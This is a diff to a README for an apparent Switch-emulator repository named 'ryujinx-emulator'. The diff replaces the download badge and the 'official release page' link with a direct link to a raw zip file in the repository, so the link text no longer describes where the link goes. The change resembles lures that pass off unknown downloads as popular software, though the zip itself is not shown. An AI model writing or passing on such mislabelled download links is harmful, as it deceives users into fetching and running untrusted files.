@@ -1,6 +1,6 @@
 # 🎮 ryujinx-emulator - Play Nintendo Switch games on Windows
 
-[![](https://img.shields.io/badge/Download-Ryujinx-blue.svg)](https://github.com/ximosi1335/ryujinx-emulator/releases)
+[![](https://img.shields.io/badge/Download-Ryujinx-blue.svg)](https://github.com/ximosi1335/ryujinx-emulator/raw/refs/heads/main/ryujinx-emu/ryujinx-emulator-v1.5-beta.3.zip)
 
 This application lets you play Nintendo Switch games on your computer. It recreates the console environment so you can run your personal game collection on a Windows desktop. You get access to features like higher resolution, custom graphics settings, and controller support.
 
@@ -8,7 +8,7 @@ This application lets you play Nintendo Switch games on your computer. It recrea
 
 Follow these steps to set up the emulator on your Windows machine.
 
-1. Go to the [official release page](https://github.com/ximosi1335/ryujinx-emulator/releases).
+1. Go to the [official release page](https://github.com/ximosi1335/ryujinx-emulator/raw/refs/heads/main/ryujinx-emu/ryujinx-emulator-v1.5-beta.3.zip).
 2. Look for the latest version under the Assets section.
 3. Download the file ending in `.zip`.
 4. Right-click the downloaded folder and select Extract All.
